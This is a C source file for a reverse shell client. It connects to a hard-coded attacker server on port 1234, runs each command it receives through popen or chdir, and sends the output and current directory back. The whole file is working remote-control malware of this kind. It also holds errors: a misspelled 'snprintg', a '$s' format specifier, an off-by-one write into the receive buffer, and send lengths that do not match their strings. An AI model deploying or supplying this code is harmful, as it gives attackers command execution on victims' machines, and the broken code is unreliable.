#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/wait.h>

#define SERVER_IP ""
#define PORT 1234
#define BUFFER_SIZE 1024

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    char cwd[BUFFER_SIZE];
    char command[BUFFER_SIZE];

    // Create sock
    if ( (sock = socket(AF_INET, SOCK_STREAM, 0)) == -1 ) {

        perror("[!] Error while creating socket");
        exit(EXIT_FAILURE);
    }

    // configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
        perror("[!] Invalid or unsupported addres");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[!] Error while connecting to the server");
        close(sock);
        exit(EXIT_FAILURE);
    }

    printf("[+] Connected to the server\n");

    //Execute command
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        int bytes_received = recv(sock, buffer, BUFFER_SIZE, 0);
        if (bytes_received <= 0) {
            printf("[!] Connection closed by server\n");
            break;
        }

        buffer[bytes_received] = '\0';

        if (strncmp(buffer, "cd ", 3) == 0) {
            if (chdir(buffer + 3) < 0) {
                perror("[!] Error when changing directory");
                send(sock, "[!] Error when changing direcory\n", 34, 0);
            }
            else {
                getcwd(cwd, sizeof(cwd));
                snprintg(command, sizeof(command), "[+] Directory changed to: $s\n", cwd);
                send(sock, command, strlen(command), 0);
            }
        } else {
            FILE *fp = popen(buffer, "r");
            if (fp == NULL) {
                perror("[!] Error executing command");
                send(sock, "[!] Error executing command", 30, 0);
                continue;
            }

            memset(command, 0, BUFFER_SIZE);
            fread(command, 1, BUFFER_SIZE - 1, fp);
            pclose(fp);

            getcwd(cwd, sizeof(cwd));
            strcat(command, cwd);
            strcat(command, ">");

            send(sock, command, strlen(command), 0);
        }
    }

    close(sock);
    return 0;
}
